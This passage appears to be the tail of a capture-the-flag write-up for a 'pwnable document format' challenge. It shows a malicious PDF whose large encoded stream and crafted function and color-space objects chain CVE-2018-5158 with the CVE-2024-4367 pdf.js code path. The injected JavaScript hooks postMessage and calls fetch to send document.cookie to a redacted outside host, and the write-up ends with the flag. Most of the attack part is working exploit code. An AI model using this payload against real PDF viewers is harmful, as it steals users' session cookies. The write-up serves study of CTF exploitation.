tq<"X7o\:)E:-(R$o.C&oqfa)j!I^(D9t+Yn*QVI`*K2DIc.?75U;pO=]kOqc1AO+E6NLT/8<D+LEneaor#_+K2#Z@bc<I?$0HTTQU#W6b/EZ;&B4m#E;d,oBf_+&bcnmFImXl@Khhi1"c9ZE^u>[]7NPT+OCb$,7IQ-+fVG$H)XPDEH;L'Vr;/6l%&2ah,H,CGSH%$kqmNI&Ys;M<,@!@mCjmrN!?rSO1EUdRk?1X!N?'[E:&F`u*ItR)O$)4a2?P9kQiC4:sQbpA?n.Rc]/o?!F,C&M8Ib%?cI5AM>"(NYZ&V:CEo[[6r+^j\g=B9\9,GGIkcnqc)VT_TH?1AIgL!(jgIFr&?:M%L@!+!.sfB/WY9nO`UtEXe5&VgNoO;#0^!+EtY)+=V?S4n+"l,/J&0jE`6_6Z0?rM<MB>g\E-HfL(Y+61VU%_7_WJeGNc'm<j"qro'&88E@0]j2;1cGB#Q,7_(n$s:k<19@]KW=pD`<VhQGFKq-F;$o%3la66lB]`9K_GT6X<`*[(EKo(a]K'WI).47h]f)/n"uR0HY=/:;)\TW0h<8c^h#F-%[;;YKC?a9m\/]N^3'Js[%J`Y05AOD+)@GGqppC.&KMUuY3&T\jd`c;)7XX73=%!fk(!`KU^R!RFH$f6u2;hK%Oo[e=mUOVVn,j;JO/Cm+7""lHdES>GajF0J:\AJLb9!U8ucBNj@<p8AF0*M#[5a=_6t6"#2sqm50?<T'9%m3^`Z6tbPcUg`PU;6r3GO!e,Zs$%TQJ+$4A@$@7.Vk>KgP.M9=>EZ-K+.s'Uq`IqkRn$X^WoM?_4b_aAr^GSg)cm`\MX)C$#OYY*eKk^Vb)0!4\'r&hfYp>qhX#Dc007)3m]HZ7+Ijap="h/"*'`GYiJ'=/S#FRj;8K2%UUu7%.57F^L:l!"_$M;PpYHV).t4O>p`4[?R,55ur>WiS$2"@L-<K_Jmdpc#U,po@O+h@Q1JIZ;mmHiiSKgaX[jB0OZIpWog*V!J-Z2($L:W%4FD<^Z'&sic`@Cdj(>)b>ia%QkhFC;BVJc!QU@"+gCh,&:[ldZ<#86F.#rn2^,<k<TUTGm`U]@l)Il>k=&@'A\`"Q(`8LA2C_LulO,i)=]XC>&`G;_X_0O*lL5%oWa',>G7,R.Car'@FK`CIl8%$0*f`LH2?L2;lE*s7mpUSfq6+>,.7g;;\`[GD8t$A9Ota]OV`VJ1H`/Vm%^li$l2BH'DOak)SC1A&Uc27,jt3GX=g$M+FOrTjufOj-tVraI5M+K,<ED3%k3T>&Wn-Fi2lV],%ZY6,.-Bu(Su"#Of/)qGfiC/D_gl_l/o+QJ>l:f1L"5kW^iY0q56YRh56b*c*m+*HL&.*!.K%#GpLiXVl[&YqccpVdN$\aaLB0dK4nMB3]q!D'_*:C1u=MY1c5,EWXSg@kuXiJ"/pP0"$>*kS=+6j>E;?h5<[hjX"kae+HpZ)Ro!OJ`K=N)6rV'C(D750?hME%#N3PD7@;c\'`Y-CF?iRC6]]ID`,_XG_&8]5(i+/uITk%qh^]fq2/PF`%i@VaC%3RM#&A#$\5)dRG-fr_89ISU$[.rd*)^mYs6Y@Fn$5d`P8Mg0MDc**U@PL'dW^OioEWPj&V)(fsBfjM-S)[_PDaV$2M7#%+bJ-t=9]E!/ju#J/TNP]G/)&%iW(EKSo;lCGK.3JWB7ekR;1D\M@r:[0&BD"sGFom<R?U)-AP65-hsVt0rZ+_ouoZ%[@Jil/al]BL1ZT+!D('A<+-obWuFr>2b(FB;>phlsl-@?Kq(##q?a7:bUeTS@QG.%^j=+0?qK7a\mHg;6[[!p;gBA)1U[j;HZ#6=mB)nl<tIhbdaBrd-r!(Nu`r`%hL&cbeneP6d/5.pUE>GM9qVl?kcuNt3R&eu]89k&li?cX>=EI?,AZjpu[mAAKFp+JhJJI;-H/,F,"u?4YF:@:?8M/Buqs<ZZWD0BO=QC/;B!N1?fZcGCN\17JH6j3AQJ:lu60HRR`MWR+!_ZGgp"oU.S>ZkZp,pgA/+l._8I=`ObRm*brOe.E5%g\D5)j8jul@&O=2i#0pe$ab?3=Ya2@^o+2N#oq5&BsSu9rbU7?C,'FrGhCETY[ZPHS76+iOFCLYdokoa^dU+9!:PY]obTVFK"60NHIh^08`W/'b;N8072.;4b1Z-nGhr_Lr1?kaqjJ6$9^[CqbE!;7nUNY$:])HH[_"TPl=*qn9LmDE]BF?=7>]EuD?b)?e/]OLY`PkHlIpPlGXnLf_G!poL#$0YL_[!0*6'?0BXiV"[SBF/Oa_pocMYdtbg?M#b3O:5:5&\6Fq=sJr8@Xia!omtdMr.4alQeElSTSt-U<[X`5b,'@SuJbGTclCZ!;sN?sk+1a;RFO7(WU5O.^sH:F8-l!W"bn!.`!'mq.8g%>fdV7/-#5_2%I.rQ;aCane(ZQaG4Dk@OL3l20PB1j]=$ls'IBVFg3YI),GE-W!rK>?o#BURniECk$j[qFBBNZoK&)%#(7&#9H"_mIka`'=TrB2g?ip8UU4;E3jU`@$HmOPhX)LSt&e`cT`3_)L(@<<9`3TGuXrU:Yel%6a+OO^]%3'Y4uYa1V!)[4-fo/Ti3he1?/Ir.^02P.MaOj@DZ,Qk_r:5$0>C4*jY4sDMY-N3NImgJ?/#&b6Z&6KZ3GlZdi!HQ&if;<tV[5CA:7Hk!rC;7$BNn9.IQ4e9%l,-ti/0Zjf(RQhN_9r`iCGGq:cP<bG!;WEDZu1ldO$?prrs7jUf4DMkiC9gsG?rLtPW:a5s1:Ah*!jJiA7pLa_r_D9lE+`%2G)I5cmmQrQ+&FS(PX,q\=);mK,a;@bdi,jt<S;8CjZ@o.8!+d$`5k6U6aV;=Z<iEIj$=c3Al1Y4:guUHs+(io3N+XmEp.*ai"a?3g\G;W.!0]hq9m#<om`7t!_)cYnoa4G)_mJ#iN;9]P"=9]\O.E4W_l3Ip_FXN+0:H;kBgQ#u]bt,Fi7%X<8)7>rrb-Y?#PSj<YLl8.Q6u(5`FMb^$#6D`Hq&ZZs)_I#87V*O-1V4AAY._RI[%1ABu.ZrD5,!Uo<J%]U[W"ZF92bX5%sn_U"tmW5DT-3AY$RZ_h99bL([%T5`>O=5fY=;%f*%?Z`M,[g@sS!G0FT!L"#H>c9N1!IGGZWUb9('jI!B[I21>RJQ(gPnis/JD&ahZITX.BVOhKT<ntUnne>sA\$]jgQA3=)!I)4.8ZkYHQ1!`[[Pa@C8i`V;>?$OPA65.3fE,6el-n1h*0'Jej4h`/]6mi%]%4B9ET4*4c?Ym$8W0mrO9_>B;"up$_,cU#4ppA<H;`E8%pL<iZsK'netL_>.tj,qdY+;&@bOTpZc<A%7M,$g[j.fl(=^->">lE3]DlLH0NUqt"84.sgcJ,1%F<D_<rRt5RFhf47O!4>`kACnPT;BZ9IXe^YWq7GP"-p4TgX0U%QV*Ln^$M"2Ki$-D?:cH]nsrW9O:qeHP[qT)4qI8.#U#I$m5LYh.II'BSR8f<fq$^PAOVjfeMSqo%TM$dXbJW(G9Kn?SU-eI9Z<&iJdi$c@GUj(F^F2\@7hcE5Ead,X1e:pOG1=k&H6TPWB#&NkChU]R_K"bcmK%D_io=r4_#EO&Xa#XdU?pT!I"T(N%KC*pe\o&R0JM0Blat.$eN_L\QbhY$(l!Z+j@9MX>ue5.#MlmE.I*1#b>&G-g/ICF`\RQZh.'r&DX!U=&Y%RO"1s"H1j7SN%L%O*ErqE,)pM\>CN)+hNgJ$Mf6EB+k+!/SjlT<lP**9s4(@!YUuJdO[B1+$gld-k_+cN)9>5+*?/h<_d1=\T2O,(JeB_G*O8E("=4*g`ebN``srK>!)sfT5;<P_nA7%I/BhW8_Q_X*pY'eadP9uXpGeH.UqNK72g=t5$r$t`@FqQKXLCA:cg`K<lU<!n^g]6'o:6r?O)4UWW!JfIRFu@7*D!jAkAXTcDq9X8I^FjGV5=C4:a=(KPt,8KWlCWX`GOP]FtdbK?&TjT=&5<[_f9Fmmg&j0<.rl#Q\7L'S8kio6O)+Z8X6[#;-OfZ'!b&3eEhXg,VH4,[F"b1n"Z*#KX*<,rgo>K_E2DDu&L(Qt>2e,i:ZCV]qnmcjD2pNuDjW(G5>S--gk'0BJ=9\!"+C)shb`Zf1_`=MGPY1B@7>e\H"2,S2!X'!rg2eO5,c<Ec&W,d1>0ge;j<[7)[A[cR`=-R\-%q`$a="n)QsOH]@"'aoQb_>88^.YumcmP"@_7$NHSQIpZ*ET0YWf;SAdCG?aB.AbKEb#JeF]I*eg>3g\%*(aTHT%euMP-,K:#5\HX=L*kjN=)I!F6MgLP2KFP31OFXbCp$A1q07ciY1?%N!f9%bO1%T)QGApSqQ*89.>a$&IGjls2-5_Coc]T>dX/*,2`'IP7YXt>Dn^55$="iiYRs_HX@-=iD+P#n[lALQJ5@j"WEq[EYueul!ec&s3mn/D/*MoAf``^4!HB/gdqDL-KPoYJ+6W>)sPck\qft<5df/Nd`B."RnNV2KG3MTI05hKR03Q"h@7fGDBq]0jg.>e.D0TCbiZf,ccIDl<jr0[C=C13cP5W3J>hE]5[(c8ksHo3-qQ)<p=00nbQ%B-Z7]<ABU$ibO*W)n>o!pFh\:!8^6S`GUX59(`gkuh^VOL*IVZP_=OCKkFb*]&RNR^V5BZah@2;+QBYJYd"SK,HB"b?5_&kfck7jUo"qgK*1s*]Lr[f]0G)Op(,3#:rq';N;m1=1fDZp`GJ]2B'dslR9+ZdcDi(Qa4:fe"8_6RnPNg=X8$-:ZBEpkhDAYnF*45q33b6*A/%XMoN@\":C`9$)M=c.MYin?#f13]F/ftPY=n)HqSU7]f_1X\-@\d!n)&T!'a(k]i33th]f19`h:oq0Y<*o''`:$B5s"H*Nt\FTktCG@8MnQI[@])[1uqFg,aJrL#PSe[0V$nN+0ro,-b`Q'!H0ba2J5<4>;_dkbNZa/EV/A;h-mVX`#+p)7^nMonCT`4E1;UesQ%`."IMQ#pT;!N0]Y)*dlH,flYb[7BE)-)Io]25YVNVhedNo'Xa%[<`Cn+l.ec=>GICGA@p/9g?d^Vjf2/1V`YePG=*bK:/;("CmrPu6dK*"oB%WqJ_>+b_9R:!^(?NLcNHVR@c;&n2l\I^\($'*msP(\/fkbg-Z&kCr>uE.TiXgok[9\*>u,E"WZ642TQPV(dg>F/-Zh9kH>6!t;jemsFp2\Y%FF=O0=W"coQUPWB,Dk$E(Y/81WJEGnCh-_YMr@m\fDq>0W0:1>0jT0q=X2q3DPZCn1&6i5EXXG7$_p9uMESp"M&e@Q<@!o3$A%'iMu!irK@b`XKO4l/0,np_Trl@JGi;BZ\s@S:jSWA!7_?b,$'D$hcAZd*&;6FBZ0@YpkV7*Z/8%AkuATb)lR^%Y9#F&m&Hi$aU*\?YAn.q?0m0UhdTc-"H]PHN4u(e85n*.],*-\1T523HMTW:h%6igg9OE8b`?^?\,;i%GhM4`EU7aFn%jRE9]+Z2FpaTtZhX_gH&:i9O7[S>6&eH^h]87,Se@]MGgY)"RZGPF9\_W]:XP,:/j#4JZgGm(KA4)H$Mf^]4<`#>[TBk$=mV(NCT*8e9(C,rID)5#4K:GUn_o1O9)fS6tRA)U@<+>VCVR$DC.*.2N<2&NOE;3CpWbb0;2BY;WF1WI&FEr!j[n_$bdZe;OWSK9fCM]$EtSeg.>G,c'f$Hlil@arbgnK'(7R@YWRFFUA5D,.Z'tL4'TZasNCbMEPLj-HUnH2j?TcK*jO&i4A3gL_[)1V'9.3Rj@8+\cJFZItrlP>3WEAQ+N7GMnprB"rk+ag%YWai))T#TfR8_a2"JN:jbl*ClG=I_=WUpSZ$o6$ac<C1gi^_8D"0Qi2'VlUokRe5gtqeCK2Q2?^q1X=RYC+k<VBcoH-c'V>]M]/*-"eke<Sp&5C'F&toVZi/)U&>-hdV,D=`DHXN#q.j2X5WX*'gadbd#%u4f>*p[N4IOMjHGTRo]mbcWq8=bDTS+h#;,&)<1;JFNG>;V223,!:&6R8h>>W(p&&=AJZN@Pe*YS/O76N"S(U&Q].69IDclo7e,8QZT.(S0O#=<V&h,6j]3,tLFCs4Z<8Ck9<)*Kt\5l@huZB4pbuSh1o"8Y^G$E&O*5qZ%Xk"@Cqha+VM1rWsr(oB>KI%r3PHBrES/NX)^D8ATJ=Rqa$1:+I-o'-\U7<Nq3^#'9Y$Nf@fmo,<ReZe<aI.9q.;N-6p<84#l+l0_ahP>=B!4s1D)A@88]S\o_WW->>d=H""0k`,,nG^+i&gJ0>V-Oa+L=Xs@s9r(^C'[B!!-nPa(m=h+$O#'5KTt:VpW]D&3O?=/*;NBgDWsVBg7=+a/#TXb,m#77)3iIh#pkLQRoG^c+#=+;rl]G\PKI#HrB_d"a7V4D8:_T"GBp"rn0KE@LgQk4XnJ,E;&14K`**[GU7#-d1=F/sJ&JL(?W_80?7V"O5X:uK[6,36heb(%u04MU/F(Hht0E&GFO<?_`QDf![We&tuZZ)]^0!H6Jne<8dMlt)hW^Ic0g9:6h<dGl#=uheH%>oT4gq9EV[d<)JO>!30HZc$=/T-(RJ;)b,!>q6KpiZ'EedaeY)+)q0UY3s=T.S^j@8$Mj$^f#uP>4F21mmXU&fIMS&NXJFpl;])5=T!n),b9k?6i3@59S#:cul8N#EMCY3O^-r.Y?%A;";);p`ju"dm=I(ZNmjVM2=A9B,aCdj!U?oi<aC$V5>-rTs=+s^d:oK$KMaDnP*UdLc7,k5=o35kG"h(!^?/Jo/Y2[hpgNDZL<G,bcOgJEbS)mJjd2dM*a,DZgK/c2L2<KHsU;Q*E$P7UU!ub?!/rWXTkun^bgj5pX6Z.18'(XiMgA]1Sp$1M9W]Y$I9a1.GeN,Bs#Kla_NE?Njgd<,jZJ"nibSgTR?=)_.R5r'g7[uQElrWbN6UIZJSjUg@6)YWJr$Vb%'l6RGICd4[.9!H3>kOStsB\^hFHEq72%7gp5c0gad:T^cCtiIeftrePjXH\g2f[Gn^"-NC\?#XgWm\W`*X:d0o5O9Jj"ia`^h:GhQ"SibVM<Q(8Wu]n[p>4C/5T5mT^$G%-9!r9:-,1Z5<CG:.s(-"D)/@Ba&%&q=Cp=MY')CT@6BLi:/7OkQNl26E(o+=GC+".uKo'(rfqGg^4Kh4G[D03[#+PE^9l(3tO*Ca`:%dO,gkN98Ut_d>pA&U;QX;&c1/56HdYKpKq?&_ifq*L;Od9UO$/rtn=]13`6."tliZ9/1!Y.nc5:>.d2WmKBqTKacP-8=]Hra;#6BUSTlY%mi<Ecion*j%=!j'X>X%b>=qsZ,HI77ZjD33s<qf?N]d1p&HltQAN#'8d6jU.c#sJr'aJUdJ+Yns,OG<"2A_bL]:p5h/eb2T`O/t+DZ;qOs4n^Ma.P-.08!gV>XD7Mhg#O"<DSEdW[o)2=HOB;;\)$*m\]iiBA:s,1-]r>jmgfEdi,t(&lWQ8SoHYMAMR)$=I"E&s%MXW407dEDu1f<&F.L;?XN>jZ>s>9+B2lM:4ksh5[Lc\(lRRn8RTaO=O.jGe_qW"aH'[gqF0?q)9t"EHhdTA7@))*2n/ZLY1Q9l0>1^Oc%79!)%L>!diLbWDZ,i/pe<_A;Q9>pGu?Qe(_$q'Fj@:I@0>5c60em:W(5A)ij5\0S`7\R.0E*CrB0seIF-%Amdf$]s;M3Z/NJF(c!&c%F)se6Df&7QO7O-a'V<b4\0k7e^M&/g*Z0.<+?6.eXkP7!p@*OI"*'Ql.!b*&ikVO8LLsGJPiYb@Wdp7RMG0-i^SZ)Ao!tL0?:!l7K?D19?7+#>$#68YK6g[ae76(KL'Q&fcm#oUK?r8Z%n6g>.57:=dMBp@?\_'s.itt">TYAN0FHm6]j@GIK7f2EK6o_\*S8&KM2Xe1ZUphF+-jZT725lr)"mt#[hjS!0,t+%rY*%>0@G_Ya`2KLjdJE=:b2:#SDL0R^-0<=$c5^b$g7/E5Y(AD`NGNJ-nJDV\gn;cF>ER?o/KDgq1$&;""WoOJ`J5kki1Ee!2d?-#2^2SnF;eG/Q9&5KuC0+\u/*+uG&"\:PeF5.&Z/I%=oYY>:]_ioo9Kmaua?3Vg@/9'\:5;/,6p"a1&2TWd\,_u^W7n]p_1IibTeF"aJ2j=eUlS%r=+%PCCp':VlAhgh;6^g/iSNt]sObQiAJ]f"*pU%<rUOd2U2?$eB)alFW28!HQ&?N9[T1E$1_VSlkp,Ejd"R5L@aFso#Z.E!7)OM<HlhT\uk@9Z?M+32sG,H2Fc&'28e98Q@:-A_Mt-D`'q7jELdiRbPR+M]0/HeqO0&:ReKY9N=]]SdSLR2QUB^$i3!@10qAY1K=2gS>^4jMTZ3m`E0[fr4s7n`n&a]bMUL!7R*?GO'W/,`GrV6-pbB,W:8A<\g(]g-J8=2/UY(U[H"-G'eS33GqfYRo&*E*HUSU$)B:el.Yki$a"e,?.i$)a+_JfNcr4Kq@j^`iebb!??9QZp"WX)ad.'A$+CjV'.;ET6qmg\+6%i5B)lOQ$GY;-rB1uCR^,-aAs?_j54o4#%@@<OBE0m2BTDdaL6\,a?\_'OR"OcDSODE)6b&uOPqYugnZ)^^JrUb>5TE`U.N&S;*]2#CXaRi[+UrQ@"_>YNLEqWP.M+//D2PbWdAl4]>;=J;fdDaG#bYGQYn]%&>gMb6BLf]Z3b\uIGMCJRWEs2l@Xt#%^;cXjbihBZjod?;#3kk]*d!A:\?k7scf.\t&Ln1['Z_HA=E!mRk/&rC'L?e671AL,JEj'\P]mL6eF2-rWMoc#$RCa3c\p"b=dBq8#A%f3fW0\JmXHaH.^MqV.?%q]?r@YV%A?em)m?3]Xk!oRSPWS1O&e</0k%Zr'DNY*REp,>U5;Wk?UKeu3#,82:#UXP##MnVgW]r"gP0MV7+U0MAf5%42%7*Kj`j!c:Xl[ANiBYp"jB1GhLue@2m[KaYq-"9`b(dlbe05r<H]i')..Yp'm7\RaA+e)*]3J!*hiCn35Gb(1I1$HiQ^KR(*AJ3;W#B>_ntWhf5"DgoH_KeJOnIiU3YuqUbY`8=K@`.lrVoKYI>R\#,80^iuA.ll_o3S*eo'mSpu"E`GsREad-@"$9Y`o"#tD@]t,,*0%4efh]aDJd1W+\pXKp,/+_Z5Bti\`p15pnRH:bn_(pCXa+bH\A/at]W"t\b.d<,;@jos(p_o&?:.2O<XP(_nB^ZI+)m=qKRo5@A'p:dEFnUIgW?>r5;Xjq]L.70j]QYD?_7Se7BW3a8eU%Zc>Nd@gAi`uJ8h?Q(rJA7Xr,99!\o=i=AAoU02aTjUJCD@?j9Kbk3;#bioErt9=si*5TGr2*pt>\1KT&:RQ!iZg=ZE(j3cOH^PIugd,!#Bn=qTF-1u=k!2MGd7s'A+&@4l/3Y90T:dTn_b@,P$.M8dCtC1VA,pKfVqiq@X'ZMHH'/7:fteiWRhdGqC/Om$[%mlAe#(i6&E7;8^t?+_l7Zadt=&[AWS^4@1fRA]X"04+O-l^TE2X#,,MBFs="_1G'r0/G_A6-fQ2JDL'[Nr[l/l1=+h7A`fAGiPJt7O\q`=^a56fa#%825@?/`qjNUWmoS6=din[Y;4C!@WW>9s(42d_f?hLR9I*LHKi-*5k53LYcN']Fa!p56B$Q(M&1Z"P:<c(6TT#KTe<jLQP].N&<0$s0FNgjL+Jr`IoX[4]?uc*1!3mCAW@TW@?gK`HWeZM(K([fjZYb&"7Bm2fL/&!V8A#Rkhu#`XRpL=>phZf4;u6mh2r$f7gNVm9P0Z.bPm]kDV^5EcD<7BERZtl,>sNFIO]mEMW)Sn.b\i8;q;!o03r`TPLc!OQin:+rt+q$K7@ep`"%8bB$7Zb)^Li(#@;rHdX[]!QAmG*7dp-:N:eq<:ZaE,V\ET>BtD7HhnSpJa(7o-F1A4s!nUoMX2cg>]kgtp4m1^uW^a:s&&'=Lk&4>=9[^r8hmNX9*5rE8)]k,K`FP:H6K0/U3Ku3;#K**n2\Qm%4TG?@bZfN%4XbPmAR"85V@VsOX"t]E8V$aJ,i)4PQK0!jc[L,;$U,_h+pHsCpSpY]*nMbb(ln@.$]^ZLAGI%niX=pmToO@pmnioP1gbe^)!Glm&pG\Zi,!FHr+DSDLLL<o,2F0XPF9)Vb@`U'nr%B6Q.iL]q5[=oUin6uVdn6[;t/;p+ABi_^TL/_emFqFRan$i8V><%RFNV78(n":jm\ka_rjD'J!.$m<.Ts(1QKs!<SHn.%7'PG5#95".Ot@B-ZcaYdd'X)cO=U2T6ICYg<DCr(uO!/>HCk.IpUN*m[M:q/.rsG#N"#Y$s12?UZiW^_5fC%:Sgs5'p7IbD34.Rn;_itD24A#*,AA.:f#,4*RDn.6_7L<An_17g*mg+XpoV?U%=oo:GRf%FJL(r@U'oOj<#.G+:@;n/=q.[#/8"3#*427h4/])^D01cWP:ri+U-j8.PYm7A3bjQ8kq%\Vos3GR_$6F,>)>Z^CFDl.-<l./*CrG9rl!AN1/g%*Kj)#ac^ccnAFL=&]4F\lc=D(+!?LdDS3B?V@W6aQKbA8Bojrqk$\^Vr4U.hjDOlW'LajPPEd#sH@AC5>t(2.6.iZU]C&as%m>8S'A%rQo&"kX&0$>9Z\)V"UsPE.PL*-\W`Wm?bI[2mT(K'=?FqK?g-5^.FJ-8K#,5_7%/J2)R,.324QNb#R5D!2OS/8P$f6DH;'O"M,!4Br=CE21eri_9.V<kSBX2ICJ-PlG8qR2u$NWI.Yu7Gc2&=q%C8MEJG/OEi99I=h'jC.@<tr^h4@n<@5h`d0Y0E&kO-"KTgR4=+O]!PnE#h7gcQHflSLjPK%oC8VWRnWG$#@18-@PJ#jnk?CQ5^e#=dOXF!kICEFn03chr/n.`;+!S,kkV9p(ER1Qhl4^[]8A=Le!S8@Yb[#?!?8j&O&s3)hpQtV?Shm=uZ[[V5:6#OB_1r+-/5-O18O0HP`At0:Y,J\9@_7_Lk@>o"AY?c;QH"^WUKB(_!G@*WuK=]O"tF-DoonU8Xt$d?NH?&HNN@kX>'%0?Y%UI!N__%Pfn4?qLsN)6Y)(]Segr<`Rr^a*$;;<%DS7[I3$MC4KUfkD.S)Q7D#7427A'k$.=Yq*!Stg#Mh8;KQj;5_S&7]Y*14<B`Ljo?!T!Csrdl3I:3jW%^[S45._BT(/&HG3S,?"S:[\&o>]fXu&M&)++]aVm"FFqFE]g7TT3i%??,V;*Pe*:]A=sZO[VU`!&J$832H5LIH6J"GqM@4NTK&RVp@&e./GHbS#ANiM"Ng$oE_)I6OI/0e;K//,&<pB[7feb#L9"CUdX?S>\@.I>)4O/LJ[1g$PV!bGM3tleUrcP^*.2Y_a8FB`V2PPH*<X-kR/@KS/d*ph]642o+?=.20/O'es8_EGF+BV\o$,E*4msJ)niq5j4C^`-qEB;9Wd\4\=]Z+c`":Q[cnbf,p[E>`ng.8funUM6\a(Gmm:*QM\UPd`*nf$^Tt1'0&]!c!_=n0(fuRIgbXn-b9t4W<Qk-i-sN?"F>lI3e%M-h6!fF@`ZToAWQIpfX6gXW?5-2o1T*u639+neRF+>(i`%.7m)W#&sM*Ha##j*G]M^;`LLmWgscdg+P$#ThfK2XUO4ECZ+jDf7g(+kDRg2A#O]6-o0n^&KD_nclEhLu9sn1Yc`4>kXQ-S^G+b`=0oRqW1A1a/C(h9OJYj:@j%\;:4WPPKP[k`.]fih)r3Pn<1TgkK#VF!?%s=^B&P>m-H;6=CroQ\("."]<"rj0
endstream
endobj
10 0 obj
<<
  /FunctionType 4
  /Domain [(this.orig = this.postMessage,this.postMessage = (message, transfers) => {if(message.data[0]=="g_d0_f1"){message.data[2].fontMatrix[4]="fetch('https://REDACTED/'+document.cookie)";}console.log(message.data);return this.orig(message,transfers);}) 0]
  /Range [0 0]
  /Length 12
>>
stream
{
  0 add
}
endstream
endobj
11 0 obj
<<
  /Type /XObject
  /Subtype /Image
  /Width 1
  /Height 1
  /ColorSpace 12 0 R
  /BitsPerComponent 8
  /Length 1
>>
stream
x
endstream
endobj
12 0 obj
[ /Indexed
  [ /DeviceN
    [/Cyan /Black]
    /DeviceCMYK
    10 0 R
  ]
  10(123)
]
endobj

xref
0 11
0000000000 65535 f 

trailer <<
  /Root 1 0 R
  /Size 11
  /ID []
>>
startxref
22862
%%EOF
```

The attack steps:

1. Use CVE-2018-5158 to execute the following code via `/Im11 Do` -> `/ColorSpace 12 0 R` -> `10(123)` -> `/Domain`:

```javascript
this.orig = this.postMessage;
this.postMessage = (message, transfers) => {
    if (message.data[0]=="g_d0_f1") {
        message.data[2].fontMatrix[4] = "fetch('https://REDACTED/'+document.cookie)";
    }
    console.log(message.data);
    return this.orig(message,transfers);
}
```

2. Then, following the same code path of CVE-2024-4367, the following code is executed in pdf.js:

```javascript
c.save();
c.transform(0.001,0,0,0.001,fetch('https://REDACTED'+document.cookie),0);
// omitted
```

Then, we can find flag from HTTP server's log.

Flag: `K17{needs_m0r3_threat_1ntel}`. 

2nd solve: `Congratulations to team jiegec for the 2nd solve on challenge pwnable document format!`.
